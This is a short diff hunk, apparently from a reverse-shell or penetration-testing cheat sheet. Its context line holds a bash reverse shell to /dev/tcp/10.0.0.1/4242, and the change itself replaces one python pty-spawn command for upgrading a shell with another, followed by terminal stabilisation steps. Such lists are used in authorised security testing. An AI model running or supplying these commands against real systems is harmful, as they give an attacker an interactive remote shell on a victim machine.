@@ -31,7 +31,7 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 ## Upgrade shell
 
 ``` bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/python -c "import pty; pty.spawn('/bin/sh')"
 export TERM=xterm
 
 stty raw -echo
